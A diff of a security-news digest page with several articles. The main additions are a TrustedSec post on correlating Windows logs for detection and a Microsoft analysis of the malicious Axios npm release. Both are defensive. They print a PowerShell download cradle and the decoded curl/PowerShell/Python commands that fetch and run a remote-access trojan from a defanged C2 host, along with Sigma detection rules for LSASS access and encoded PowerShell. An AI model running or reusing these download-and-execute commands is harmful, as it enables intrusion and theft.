+Experts have countered that few new consumer-grade routers would be available for purchase under this new FCC policy (besides maybe Musk’s Starlink satellite Internet routers, which are produced in Texas). The FCC says router makers can apply for a special “conditional approval” from the Department of War or Department of Homeland Security, and that the new policy does not affect any previously-purchased consumer-grade routers.
+This is helpful information and worth passing on to folks who might be interested.
+But… I wish there were clearer information about which routers are at risk.
+I’m an individual and have no responsibility outside of my own home.
+But if I were to send this to, say, a public official charged with securing their networks, what might I say? I’m “just an outsider” and *not to be trusted.* As is appropriate, given a zero trust environment.
+Looking for a flash of brilliance here.
+There are several links to other resources in the story, including this advisory from the NCSC, which lists very specifically which models they saw affected and why.
+https://www.ncsc.gov.uk/news/apt28-exploit-routers-to-enable-dns-hijacking-operations
+Now that I look at the NCSC’s advisory closer, it mainly lists specific TP-Link devices it saw as part of the botnet, as well as domains and IP addresses associated with the DNS botnet. But it doesn’t mention Microtik. Hopefully, someone else can weigh in on that front.
+IOC list…
+https://www.ncsc.gov.uk/news/apt28-exploit-routers-to-enable-dns-hijacking-operations#ioc</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-3" class="article-body">
+            <h2 class="article-title">[Webinar] How to Close Identity Gaps in 2026 Before AI Exploits Enterprise Risk</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/webinar-how-to-close-identity-gaps-in.html" target="_blank">Original Link</a></p>
+            <div class="content-text">In the rapid evolution of the 2026 threat landscape, a frustrating paradox has emerged for CISOs and security leaders: [Identity programs are maturing, yet the risk is actually increasing](https://thehacker.news/identity-maturity-2026?source=article).
+According to new research from the Ponemon Institute, hundreds of applications within the typical enterprise remain disconnected from centralized identity systems. These "dark matter" applications operate outside the reach of standard governance, creating a massive, unmanaged attack surface that is now being aggressively exploited—not just by human threat actors, but by autonomous AI agents.
+The Invisible Threat: Disconnected Apps & AI Amplification
+Modern enterprises have invested heavily in IAM and Zero Trust, but the "last mile" of identity—legacy apps, localized accounts, and siloed SaaS—remains a stubborn blind spot.
+The entry of AI into the workforce has turned this gap from a compliance headache into a critical vulnerability. As organizations deploy AI copilots and autonomous agents to increase productivity, these agents often require access to the very systems that sit outside your centralized control.
+The result? AI agents are inadvertently amplifying credential risks, reusing stale tokens, and navigating paths of least resistance that your security team can’t even see.
+Join the 2026 Identity Maturity Briefing
+To help security leaders navigate this "Confidence Gap," The Hacker News is [hosting an exclusive webinar featuring](https://thehacker.news/identity-maturity-2026?source=article) Mike Fitzpatrick (Ponemon Institute) and Matt Chiodi (CSO, Cerby).
+They will break down the latest findings from over 600 IT and security leaders and provide a tactical roadmap for closing the identity gaps that lead to audit friction and stalled digital initiatives.
+In this session, you will uncover:
+- Exclusive 2026 Benchmark Data: See how your identity maturity compares to your peers.
+- The "Shadow AI" Factor: Understand how AI agents are expanding your disconnected surface area.
+- The Cost of Manual Management: Why relying on manual password and credential fixes is a losing strategy in 2026.
+- Practical Remediation Steps:Learn exactly what leading organizations are doing now to regain control of every application.
+Why You Should Attend
+If you are leading an identity, security, or compliance strategy, "doing more of the same" is no longer an option. This conversation is designed to move you beyond theoretical maturity and into operational control.
+Secure your spot now to get the data-driven insights you need to protect your organization’s most fragmented—and most targeted—asset: Identity.
+[Register for the Webinar: Identity Maturity Under Pressure](https://thehacker.news/identity-maturity-2026?source=article) →
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-4" class="article-body">
+            <h2 class="article-title">Building a Detection Foundation: Part 5 - Correlation in Practice</h2>
+            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/building-a-detection-foundation-part-5-correlation-in-practice" target="_blank">Original Link</a></p>
+            <div class="content-text">Building a Detection Foundation: Part 5 - Correlation in Practice
+Table of contents
+From Data Sources to Detection
+We've covered a lot of ground in this series: Windows Security events for logon tracking and process execution; PowerShell logging for script visibility; Sysmon for network connections; registry changes; and everything native logging misses.
+But having logs isn't the same as using them effectively. In this final part, I want to walk through how these data sources work together—in detection engineering and Incident Response.
+As can be gleaned from the previous posts in this series, to get the most out of the logs, a SIEM solution where logs are shipped to is a must. Local logs have proven invaluable, but they are at the mercy of the attacker.
+The Correlation Model
+At the heart of Windows forensics and detection is a simple concept: every action happens in a context. That context is defined by:
+- Who: The user account and session
+- What: The process, command, or action
+- When: The timestamp
+- Where: The system, and potentially the source system for remote activity
+- How: The parent process, the logon type, the network path
+Our logging foundation captures each of these elements across multiple event sources. The art is correlating them.
+The LogonID Thread
+I've mentioned LogonID repeatedly throughout this series because it's the key correlation point in Windows. Let me show you how it ties everything together.
+When a user logs on (Event 4624), they receive a LogonID. That same LogonID appears in:
+- Event 4688 / Sysmon Event 1: Process creation by that session
+- Events 4656, 4663: Object access by that session
+- Event 4672: Special privileges for that session
+- PowerShell 4103, 4104: Script execution by that session
+- Sysmon Event 3: Network connections by processes in that session
+This means you can take any suspicious event and trace it back to:
+- The session it belongs to
+- All other activity within that session
+- The authentication event that created the session
+A Real Investigation Flow
+Let me walk through a realistic scenario that demonstrates this correlation.
+Initial Alert: Your SIEM detects a suspicious PowerShell script block (Event 4104):
+Event ID: 4104
+TimeCreated: 2024-03-15 14:23:45
+ScriptBlockText:
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+$wc = New-Object System.Net.WebClient
+$wc.DownloadString("https://192.168.100.50/beacon.ps1") | IEX
+This is a download cradle with certificate validation bypass. Clearly malicious. Now what?
+Step 1: Identify the session
+Look at the same event's metadata to get the user context and Security ID.
+Step 2: Find the process context (Sysmon Event 1)
+Query for powershell.exe process creation around the same time:
+Now you know:
+- PowerShell was spawned by cmd. exe
+- Execution policy was bypassed
+- Window was hidden
+- User was CORP\jsmith
+- LogonID is 0x7A8B4
+Step 3: Trace the parent chain
+What spawned cmd. exe? Query Sysmon Event 1 for that process ID:
+Outlook spawned the command prompt. This is likely a phishing email with a malicious attachment or link.
+Step 4: Check network connections (Sysmon Event 3)
+Did PowerShell actually connect to that IP address?
+Event ID: 3 (Sysmon)
+TimeCreated: 2024-03-15 14:23:46
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+DestinationIp: 192.168.100.50
+DestinationPort: 443
+Protocol: tcp
+User: CORP\jsmith
+Confirmed. PowerShell connected to the C2 server.
+Step 5: Look for follow-up activity
+Using the LogonID, search for all subsequent events in that session:
+- Additional process creation (Event 4688, Sysmon 1)
+- File creation (Sysmon Event 11)
+- Registry modifications (Sysmon Events 12, 13)
+- More network connections (Sysmon Event 3)
+- LSASS access (Sysmon Event 10)
+Step 6: Identify the initial AP (Event 4624)
+Event ID: 4624
+TimeCreated: 2024-03-15 08:15:22
+TargetUserName: jsmith
+LogonType: 2
+WorkstationName: WORKSTATION01
+LogonId: 0x7A8B4
+The user logged on interactively at 8:15AM. The malicious activity started at 2:23PM. The attacker likely had to wait for the user to interact with the phishing email.
+Step 7: Scope the damage
+With the session bounded by logon (4624) and logoff (4634), you can identify everything that happened:
+- Files created or modified
+- Registry changes
+- Lateral movement attempts
+- Data staged for exfiltration
+Building Detections That Use Correlation
+Detection engineering benefits from correlation too. Instead of alerting on individual events, you can build detections that require multiple corroborating signals.
+Example 1: LSASS Access From Suspicious Parent
+Logic: Alert when a process accesses LSASS (Sysmon Event 10) AND the parent process is unusual
+# Pseudocode detection logic
+correlation:
+- sysmon_event_10:
+TargetImage: "lsass.exe"
+GrantedAccess:
+- "0x1010"
+- "0x1FFFFF"
+- sysmon_event_1:
+ProcessId: $source_process_id
+ParentImage: not in [
+"MsMpEng.exe",
+"csrss.exe",
+"services.exe"
+]
+Example 2: Download and Execute Pattern
+Logic: Alert when you see a network connection (Sysmon Event 3) followed by a new process creation (Sysmon Event 1) from a script interpreter within a short time window
+# Pseudocode
+correlation:
+- sysmon_event_3:
+Image: contains ["powershell", "wscript", "cscript", "mshta"]
+DestinationIsIpv6: false
+- within 30 seconds:
+- sysmon_event_1:
+ParentImage: same as above
+Image: not in [legitimate_children]
+Example 3: Persistence Followed by Execution
+Logic: Alert when a registry run key is created (Sysmon Event 13) and then a process starts from that path
+# Pseudocode
+correlation:
+- sysmon_event_13:
+TargetObject: contains "CurrentVersion\Run"
+Details: capture as $executable_path
+- within 1 hour:
+- sysmon_event_1:
+Image: equals $executable_path
+Practical Detection Examples
+Let me provide some concrete Sigma-style detection rules that leverage our logging foundation. I like [Sigma](https://github.com/SigmaHQ/sigma) rules because they can be used with most SIEMs.
+Encoded PowerShell Execution
+title: Encoded PowerShell Command Execution
+status: stable
+logsource:
+product: windows
+category: process_creation
+detection:
+selection_process:
+Image|endswith: '\powershell.exe'
+selection_encoded:
+CommandLine|contains:
+- ' -enc '
+- ' -encodedcommand '
+- ' -ec '
+condition: selection_process and selection_encoded
+level: medium
+LSASS Memory Access
+title: LSASS Memory Access by Suspicious Process
+status: stable
+logsource:
+product: windows
+category: sysmon
+service: sysmon
+detection:
+selection:
+EventID: 10
+TargetImage|endswith: '\lsass.exe'
+GrantedAccess:
+- '0x1010'
+- '0x1410'
+- '0x1FFFFF'
+filter_legitimate:
+SourceImage|contains:
+- '\MsMpEng.exe'
+- '\vmtoolsd.exe'
+- '\csrss.exe'
+condition: selection and not filter_legitimate
+level: high
+Remote PowerShell Execution (WinRM)
+New Service Installation
+title: Suspicious Service Installation
+status: stable
+logsource:
+product: windows
+service: security
+detection:
+selection:
+EventID: 4697
+filter_legitimate:
+ServiceFileName|contains:
+- '\Windows\'
+- '\Program Files\'
+condition: selection and not filter_legitimate
+level: high
+Building a Correlation Playbook
+When responding to incidents, having a systematic approach helps. Here's a playbook structure:
+For Any Suspicious Process:
+1. Get process details (Sysmon Event 1)
+- Image, CommandLine, Hashes
+- Parent process chain
+2. Check network activity (Sysmon Event 3)
+- Did this process make external connections?
+3. Check file operations (Sysmon Event 11)
+- Did this process create files?
+4. Check registry operations (Sysmon Events 12, 13, 14)
+- Did this process establish persistence?
+5. Identify the session (LogonID → Event 4624)
+- Who was logged on?
+- From where?
+6. Scope all session activity
+- What else happened in this session?
+For Lateral Movement Investigation:
+1. Identify network logons (Event 4624, LogonTypes 3, 10)
+- From which source IP addresses?
+- Which accounts?
+2. Trace the source
+- Look for the same account on the source system
+- What initiated the connection?
+3. Check for credential material
+- LSASS access on source (Sysmon Event 10)
+- Kerberos ticket requests (Events 4768, 4769)
+The Value of Redundancy
+Throughout this series, I've emphasized layered telemetry, sometimes a bit too much? Let me give you one final example of why this all matters.
+Scenario: An attacker uses a signed, living-off-the-land (LOTL) binary to execute malicious code.
+What EDR might show: Possibly nothing—the binary is signed and commonly used.
+What you'll see with our foundation:
+Event Source | What It Captures |
+|---|---|
+Event 4624 | Initial logon session |
+Event 4688 | mshta.exe execution with URL parameter |
+Sysmon Event 1 | Same, plus hash, parent process |
+Sysmon Event 3 | Network connection to malicious URL |
+PowerShell 4104 | If PowerShell was spawned, full script content |
+Sysmon Event 11 | Any payloads written to disk |
+Sysmon Event 13 | Persistence mechanisms created |
+Even if your EDR is blind, you have the full story.
+Final Thoughts
+Building a detection foundation isn't a one-time project. It's a capability that requires ongoing attention:
+- Tune your configurations as you learn what's noisy and what's valuable.
+- Test your visibility by running adversary simulations.
+- Practice correlation before you need it in a real incident.
+- Document your environment so you know what's logging and what isn't.
+The ultimate goal we've worked toward in this series is resilience. When (not if) your primary security tool misses something, you want to have the data to detect and investigate independently.
+The techniques we've covered—native Windows auditing, PowerShell logging, and Sysmon—are proven, operationally tested, and free. They require effort to implement well, but that effort pays dividends every time you use them to answer the question: "What exactly happened here?"
+If you need help with this effort, [get in touch with us](https://trustedsec.com/contact)! We have a great Purple Team that can assist in planning and building your detection foundation.
+I may tackle the same approach for Linux ... 🤔</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-5" class="article-body">
             <h2 class="article-title">Germany Doxes “UNKN,” Head of RU Ransomware Gangs REvil, GandCrab</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/04/germany-doxes-unkn-head-of-ru-ransomware-gangs-revil-gandcrab/" target="_blank">Original Link</a></p>
             <div class="content-text">An elusive hacker who went by the handle “UNKN” and ran the early Russian ransomware groups GandCrab and REvil now has a name and a face. Authorities in Germany say 31-year-old Russian Daniil Maksimovich Shchukin headed both cybercrime gangs and helped carry out at least 130 acts of computer sabotage and extortion against victims across the country between 2019 and 2021.
 Shchukin was named as UNKN (a.k.a. UNKNOWN) in [an advisory](https://www.bka.de/DE/IhreSicherheit/Fahndungen/Personen/BekanntePersonen/CC_BW/DMS/Sachverhalt.html?nn=26874#detailinformationen265540) published by the German Federal Criminal Police (the “Bundeskriminalamt” or BKA for short). The BKA said Shchukin and another Russian — 43-year-old Anatoly Sergeevitsch Kravchuk — extorted nearly $2 million euros across two dozen cyberattacks that caused more than 35 million euros in total economic damage.
 Germany’s BKA said Shchukin acted as the head of one of the largest worldwide operating ransomware groups GandCrab and REvil, which pioneered the practice of double extortion — charging victims once for a key needed to unlock hacked systems, and a separate payment in exchange for a promise not to publish stolen data.
 Shchukin’s name appeared in a [Feb. 2023 filing](https://krebsonsecurity.com/wp-content/uploads/2026/04/shchukin-seizure-revil.pdf) (PDF) from the U.S. Justice Department seeking the seizure of various cryptocurrency accounts associated with proceeds from the REvil ransomware gang’s activities. The government said the digital wallet tied to Shchukin contained more than $317,000 in ill-gotten cryptocurrency.
-The Gandcrab ransomware affiliate program first surfaced in January 2018, and paid enterprising hackers huge shares of the profits just for hacking into user accounts at major corporations. The Gandcrab team would then try to expand that access, often siphoning vast amounts of sensitive and internal documents in the process. The malware’s curators shipped five major revisions to the GandCrab code, each corresponding with sneaky new features and bug fixes aimed at thwarting the efforts of computer security firms to stymie the spread of the malware.
+The GandCrab ransomware affiliate program first surfaced in January 2018, and paid enterprising hackers huge shares of the profits just for hacking into user accounts at major corporations. The GandCrab team would then try to expand that access, often siphoning vast amounts of sensitive and internal documents in the process. The malware’s curators shipped five major revisions to the GandCrab code, each corresponding with sneaky new features and bug fixes aimed at thwarting the efforts of computer security firms to stymie the spread of the malware.
 On May 31, 2019, the GandCrab team [announced](https://krebsonsecurity.com/2019/07/whos-behind-the-gandcrab-ransomware/) the group was shutting down after extorting more than $2 billion from victims. “We are a living proof that you can do evil and get off scot-free,” GandCrab’s farewell address famously quipped. “We have proved that one can make a lifetime of money in one year. We have proved that you can become number one by general admission, not in your own conceit.”
 The REvil ransomware affiliate program materialized around the same as GandCrab’s demise, fronted by a user named UNKNOWN who announced on a Russian cybercrime forum that he’d deposited $1 million in the forum’s escrow to show he meant business. By this time, many cybersecurity experts [had concluded](https://krebsonsecurity.com/2019/07/is-revil-the-new-gandcrab-ransomware/) REvil was little more than a reorganization of GandCrab.
 UNKNOWN also gave [an interview](https://therecord.media/i-scrounged-through-the-trash-heaps-now-im-a-millionaire-an-interview-with-revils-unknown) to Dmitry Smilyanets, a former malicious hacker hired by Recorded Future, wherein UNKNOWN described a rags-to-riches tale unencumbered by ethics and morals.
@@ -270,69 +434,168 @@ Just link to the video from 37c3 with dubbing https://media.ccc.de/v/37c3-12134-
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-3" class="article-body">
-            <h2 class="article-title">New FortiClient EMS flaw exploited in attacks, emergency patch released</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/new-fortinet-forticlient-ems-flaw-cve-2026-35616-exploited-in-attacks/" target="_blank">Original Link</a></p>
-            <div class="content-text">Fortinet has released an emergency weekend security update for a new critical FortiClient Enterprise Management Server (EMS) vulnerability that is actively exploited in attacks.
-Tracked as CVE-2026-35616, the flaw is an improper access control vulnerability that allows unauthenticated attackers to execute code or commands via specially crafted requests.
-The issue was patched Saturday, with Fortinet confirming it has been exploited in the wild.
-"Fortinet has observed this to be exploited in the wild and urges vulnerable customers to install the hotfix for FortiClient EMS 7.4.5 and 7.4.6," [warns Fortinet](https://fortiguard.fortinet.com/psirt/FG-IR-26-099).
-Fortinet says the vulnerability impacts FortiClient EMS versions 7.4.5 and 7.4.6 and can be mitigated by installing one of the following hotfixes:
-[https://docs.fortinet.com/document/forticlient/7.4.5/ems-release-notes/832484](https://docs.fortinet.com/document/forticlient/7.4.5/ems-release-notes/832484)- for FortiClientEMS 7.4.5[https://docs.fortinet.com/document/forticlient/7.4.6/ems-release-notes/832484](https://docs.fortinet.com/document/forticlient/7.4.6/ems-release-notes/832484)- for FortiClientEMS 7.4.6
-The vulnerability will also be fixed in the upcoming FortiClientEMS 7.4.7. FortiClient EMS 7.2 is not affected.
-The flaw was discovered by cybersecurity firm Defused, which described it as a pre-authentication API access bypass that allows attackers to bypass authentication and authorization controls entirely.
-Defused [shared on X](https://x.com/DefusedCyber/status/2040315969159995847) that they observed the flaw being exploited as a zero-day earlier this week before reporting it to Fortinet under responsible disclosure.
-Internet security watchdog [Shadowserver](https://x.com/Shadowserver/status/2040845567882928304) has found over 2,000 exposed FortiClient EMS instances online, with the majority located in the USA and Germany.
-The vulnerability follows a separate critical FortiClient EMS flaw, [CVE-2026-21643](https://www.bleepingcomputer.com/news/security/critical-fortinet-forticlient-ems-flaw-now-exploited-in-attacks/), reported last week and also actively exploited in attacks.
-Both vulnerabilities were discovered by Defused, with Fortinet also crediting Nguyen Duc Anh for the latest flaw.
-Fortinet is urging customers to apply the hotfixes immediately or upgrade to version 7.4.7 when it becomes available to mitigate the risk of compromise.
-[Automated Pentesting Covers Only 1 of 6 Surfaces.](https://hubs.li/Q048zztN0)
-Automated pentesting proves the path exists. BAS proves whether your controls stop it. Most teams run one without the other.
-This whitepaper maps six validation surfaces, shows where coverage ends, and provides practitioners with three diagnostic questions for any tool evaluation.
-Comments
-NoneRain - 20 hours ago
-So, will this happen every month to Fortinet exposed services? Thanks God I don't pay for those in my end.
-notta3d - 18 hours ago
-Why does anyone use this company's products? This is almost a daily occurrence with this company. I wouldn't be able to sleep at night if we used them. No thank you.</div>
+        <div id="art-6" class="article-body">
+            <h2 class="article-title">Mitigating the Axios npm supply chain compromise</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/" target="_blank">Original Link</a></p>
+            <div class="content-text">On March 31, 2026, two new npm packages for updated versions of Axios, a popular HTTP client for JavaScript that simplifies making HTTP requests to a REST endpoint with over 70 million weekly downloads, were identified as malicious. These versions (1.14.1 and 0.30.4) were injected with a malicious dependency to download payloads from known actor command and control (C2). Microsoft Threat Intelligence has attributed this infrastructure and the Axios npm compromise to Sapphire Sleet, a North Korean state actor.
+Following successful connection to the malicious C2, a second-stage remote access trojan (RAT) payload was automatically deployed based on the operating system of the compromised device, including macOS, Windows, and Linux. This activity follows the pattern of recent high-profile [supply chain attacks](https://www.microsoft.com/en-us/security/blog/2026/03/24/detecting-investigating-defending-against-trivy-supply-chain-compromise/), where other adversaries poison widely adopted open-source frameworks and their distribution channels to achieve broad downstream impact.
+Users who have installed Axios version 1.14.1 or 0.30.4 should rotate their secrets and credentials immediately and downgrade to a safe version (1.14.0 or 0.30.3). Users should also follow the [mitigation and protection guidance](#mitigation-and-protection-guidance) provided in this blog, including disabling auto-updates for Axios npm packages, since the malicious payload includes a hook that will continue to attempt to update.
+This blog shares Microsoft Threat Intelligence’s findings from our analysis, [Microsoft Defender detections](#microsoft-defender-detections) in place that alerted and protected our customers, additional protections we have implemented in our products to detect and block malicious components, and suggested mitigations for organizations to prevent further compromise.
+Analysis of the attack
+On March 31, 2026, two malicious versions of Axios npm packages were released. These packages connected to a known malicious domain (C2) owned by Sapphire Sleet to retrieve a second-stage remote access trojan (RAT). Since Axios packages are commonly auto-updated, any projects with Axios versions higher than axios@^1.14.0 or axios@^0.30.0 connected to this Sapphire Sleet C2 upon installation and downloaded second-stage malware. Windows, macOS, and Linux systems are all targeted with platform-specific payloads.
+Microsoft Threat Intelligence has determined the account that created the plain-crypto-js package is associated with Sapphire Sleet infrastructure. That account has been disabled.
+Silent install-time code execution using dependency insertion
+The updated versions of Axios inject plain-crypto-js@4.2.1, a fake runtime dependency that executes automatically through post-install with no user interaction required. The trusted package’s application logic is not modified; instead, the threat actor added a dependency that is never imported by the package’s runtime code but only exists to trigger an install-time script to download the second-stage RAT. That means normal app behavior might remain unchanged while malicious activity occurs during npm installation or npm update on developer endpoints and continuous integration and continuous delivery (CI/CD) systems.
+The dependency is seeded into a clean release (plain-crypto-js@4.2.0) to establish publishing history and reduce scrutiny. A follow‑up release adds the malicious install-time logic (plain-crypto-js@4.2.1), introducing an install hook that runs node setup.js and includes a clean manifest stub (package.md) intended for later replacement.
+Two Axios releases are then published with a surgical manifest-only change: axios@1.14.1 and axios@0.30.4 add plain-crypto-js@^4.2.1 as a dependency while leaving Axios source code unchanged. The publication metadata differs from the project’s normal CI-backed publishing pattern (for example, missing trusted publisher binding and missing corresponding repo tag/commit trail for the malicious version).
+Execution on compromised environments
+The first-stage loader (setup.js) uses layered obfuscation to reconstruct sensitive strings (module names, platform identifiers, file paths, and command templates) at runtime. A developer or CI job runs npm install axios (or a dependency install/update that resolves to the affected versions). The package manager resolves and installs the injected dependency (plain-crypto-js@4.2.1).
+During installation, the dependency’s lifecycle script automatically launches node setup.js (no additional user step required), which decodes embedded strings at runtime, identifies the platform, and connects to hxxp://sfrclak[.]com:8000/6202033 to fetch the next stage.
+Single endpoint C2 with OS-specific responses
+The package connects to a Sapphire Sleet-owned domain (hxxp://sfrclak[.]com), which fetches a second-stage payload from an actor-controlled server running on port 8000. The associated IP address (142.11.206[.]73) is tied to Hostwinds, a virtual private server (VPS) provider that Sapphire Sleet is known to commonly use when establishing C2.
+All platforms connect to the same resource over the same path (hxxp://sfrclak[.]com:8000/6202033), and the OS selection is conveyed through POST bodies packages.npm.org/product0|product1|product2. This enables the operator to serve platform-specific payloads from one route while keeping the client-side logic minimal. On Windows, the malicious npm drops a VBScript stager. On macOS, the malicious npm package drops a native binary.
+- macOS: packages.npm.org/product0
+- Windows: packages.npm.org/product1
+- Linux/other: packages.npm.org/product2
+Second-stage delivery and execution mechanics by OS
+macOS (Darwin)
+On macOS, the RAT is identified as a native binary: com.apple.act.mond.
+Setup.js writes an AppleScript into a temp location and runs it silently using nohup osascript … &. AppleScript POSTs packages.npm.org/product0 to hxxp://sfrclak[.]com:8000/6202033, downloads a binary to /Library/Caches/com.apple.act.mond, applies chmod 770, then starts it using /bin/zsh in the background.
+node setup.js └─ sh -c 'curl -o /Library/Caches/com.apple.act.mond |
+The AppleScript is removed afterward; the durable artifact is typically Library/Caches/com.apple.act.mond.
+- SHA-256: 92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a
+Observed macOS command (as decoded):
+sh -c 'curl -o /Library/Caches/com.apple.act.mond -d packages.npm.org/product0 -s hxxp://sfrclak[.]com:8000/6202033 && chmod 770 /Library/Caches/com.apple.act.mond && /bin/zsh -c "/Library/Caches/com.apple.act.mond hxxp://sfrclak[.]com:8000/6202033 &" &> /dev/null' |
+Windows
+On Windows, the RAT is identified as a PowerShell: 6202033.ps1.
+- SHA-256: ed8560c1ac7ceb6983ba995124d5917dc1a00288912387a6389296637d5f815c
+- SHA-256: 617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101
+node.exe setup.js ← npm post-install hook └─ drops: %TEMP%\6202033.vbs ← VBScript stager |
+On first execution, the PowerShell RAT creates %PROGRAMDATA%\system.bat and adds a registry run key at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate to enable re-fetching of RAT after every reboot. This added registry run key can persist after reboot.
+- SHA-256: f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd
+The chain locates PowerShell (using where powershell) then copies and renames the PowerShell into %PROGRAMDATA%\wt.exe (masquerading as a benign-looking executable name). It writes a VBScript in %TEMP% and runs it using cscript //nologo to keep user-facing windows hidden.
+The VBScript launches hidden cmd.exe to POST packages.npm.org/product1 to hxxp://sfrclak[.]com:8000/6202033, saves the response to a temp .ps1, executes it with hidden window and execution-policy bypass, then deletes the .ps1.
+The temporary .vbs is also removed; the durable artifact is often %PROGRAMDATA%\wt.exe.
+Observed Windows command (as decoded):
+"cmd.exe" /c curl -s -X POST -d "packages.npm.org/product1" "hxxp://sfrclak[.]com:8000/6202033" > "C:\Users\<user>\AppData\Local\Temp\6202033.ps1" & "C:\ProgramData\wt.exe" -w hidden -ep bypass -file "C:\Users\<user>\AppData\Local\Temp\6202033.ps1" "hxxp://sfrclak[.]com:8000/6202033" & del "C:\Users\<user>\AppData\Local\Temp\6202033.ps1" /f </user></user></user> |
+Linux/others
+On Linux, the RAT is identified as a Python payload: ld.py.
+- SHA-256: fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf
+A Python payload is written to /tmp/ld.py and launched detached using nohup python3 … &, suppressing output (> /dev/null 2>&1).
+node setup.js └─ /bin/sh -c "curl -o /tmp/ld.py |
+Setup.js executes a shell one-liner to POST packages.npm.org/product2 to hxxp://sfrclak[.]com:8000/6202033.
+The response is saved as /tmp/ld.py and executed in the background using nohup python3 /tmp/ld.py hxxp://sfrclak[.]com:8000/6202033 … &.
+/tmp/ld.py remains a key on-disk indicator in typical flows.
+Observed Linux/Unix command (as decoded):
+/bin/sh -c "curl -o /tmp/ld.py -d packages.npm.org/product2 -s hxxp://sfrclak[.]com:8000/6202033 && nohup python3 /tmp/ld.py hxxp://sfrclak[.]com:8000/6202033 > /dev/null 2>&1 &" |
+Post-execution defense evasion
+After launching the second-stage payload, the installer logic removes its own loader (setup.js) and removes the manifest (package.json) that contained the install trigger.
+It then renames package.md to package.json, leaving behind a clean-looking manifest to reduce the chance that post-incident inspection of node_modules reveals the original install hook.
+RAT deployment as covert remote management
+The Windows RAT is a PowerShell script that functions as a covert remote management component designed to persist on Windows systems and maintain continuous contact with an external command server. When executed, it generates a unique host identifier, collects detailed system and hardware information (including OS version, boot time, installed hardware, and running processes), and establishes persistence by creating a hidden startup entry that re-launches the script at user sign in under the guise of a legitimate update process.
+The RAT communicates with the remote server using periodic, encoded HTTP POST requests that blend in with benign traffic patterns, initially sending host inventory and then polling for follow‑on instructions. Supported commands allow the remote threat actor to execute arbitrary PowerShell code, enumerate files and directories across the system, inject additional binary payloads directly into memory, or terminate execution on demand. To reduce forensic visibility, the script favors in‑memory execution, temporary files, and Base64‑encoded payloads, enabling flexible control of the compromised system while minimizing on‑disk artifacts.
+Who is Sapphire Sleet?
+Sapphire Sleet is a North Korean state actor that has been active since at least March 2020. The threat actor focuses primarily on the finance sector, including cryptocurrency, venture capital, and blockchain organizations. These targets are often global, with a particular interest in the United States, as well as countries in Asia and the Middle East. The primary motivation of this actor is to steal cryptocurrency wallets to generate revenue, and target technology or intellectual property related to cryptocurrency trading and blockchain platforms.
+Sapphire Sleet often leverages social networking sites, such as LinkedIn, to initiate contact by directing users to click links, leading to malicious files hosted on attacker-controlled cloud storage services such as OneDrive or Google Drive, using domains masquerading as financial institutions like United States-based banks or cryptocurrency pages, and fraudulent meeting links that impersonate legitimate video conferencing applications, such as Zoom. Sapphire Sleet overlaps with activity tracked by other security vendors as UNC1069, STARDUST CHOLLIMA, Alluring Pisces, BlueNoroff, CageyChameleon, or CryptoCore.
+Mitigation and protection guidance
+In organizations where the security posture of npm packages might require review of updates prior to deployment, disabling auto-upgrade features is strongly encouraged. In package.json, remove use of caret (^) or tilde (~) which allow auto-upgrade of any minor or patch update up to a major version. Instead, use an exact version and handle upgrades manually.
+What to do now if you’re affected
+For organizations affected by this attack, Microsoft Threat Intelligence recommends the following steps:
+- Roll back all deployments of Axios to safe versions (1.14.0 or 0.30.3 or earlier).
+- Use overrides to force pinned versions for transitive dependencies.
+- Flush the local cache with “npm cache clean –force“.
+- Disable or restrict automated dependency bots for critical packages.
+- Adopt Trusted Publishing with OIDC to eliminate stored credentials.
+- Review your CI/CD pipeline logs for any npm install executions that might have updated to axios@1.14.1 or axios@0.30.4 or presence of plain-crypto-js in your npm install / npm ci outputs.
+- Look for outbound connections in network egress traffic to sfrclak[.]com or 142.11.206[.]72 on port 8000.
+- Developer machines: Search home directory for any node_modules folder containing plain-crypto-js or axios@1.14.1 or axios@0.30.4.
+- Rotate all secrets and credentials that are exposed to compromised systems.
+- When possible, ignore postinstall scripts. If the scenario allows, use “npm ci –ignore-scripts” to prevent postinstall hooks from running or disable postinstall scripts by default with “npm config set ignore-scripts true”.
+- Remove all Axios files/code from the victim systems and re-install cleanly.
+Defending against the Axios supply chain attack
+Microsoft Threat Intelligence recommends the following mitigation measures to protect organizations against this threat.
+- Fully stop Axios from being upgraded unless you explicitly choose to upgrade – In package.json, remove ^ or ~ (which allows auto-upgrade of any minor or patch update) and use an exact version. NOTE: With this change, versions never upgrade unless you change them manually:
+{ "dependencies": { "axios": "1.14.0" } } `` |
+- Block Axios upgrades even if a transitive dependency tries – If Axios appears indirectly, force a version using overrides (npm ≥ 14). This forces all dependencies to use the pinned version, which is especially useful for security incidents. NOTE: With this change, versions never upgrade unless you change them manually:
+{ "overrides": { "axios": "1.14.0" } } `` |
+- Disable automated dependency bots (such as Dependabot or Renovate) by disabling or restricting Axios updates in their config to prevent PR‑based auto‑updates, which are often mistaken for npm behavior:
